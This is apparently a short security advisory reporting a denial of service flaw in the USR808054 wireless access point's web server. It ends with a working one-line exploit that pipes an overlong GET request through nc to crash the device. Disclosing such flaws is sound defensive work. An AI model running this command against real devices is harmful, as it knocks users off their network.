source: https://www.securityfocus.com/bid/10840/info

The USR808054 wireless access point is reported to contain a denial of service vulnerability in its embedded web server.

When malicious requests are received by the device, it will reportedly crash, denying service to legitimate users of the access point.

This issue can be exploited by anybody with network connectivity to the administration HTTP server, no authentication is required.

Version 1.21h of the device was found to be vulnerable, but other versions are also likely affected. Due to the practice of code-reuse in companies, it is also possible that other devices and products have this same flaw.

perl -e '$a = "GET / " . "A"x250 . "\r\n\r\n" ; print $a' | nc ap 80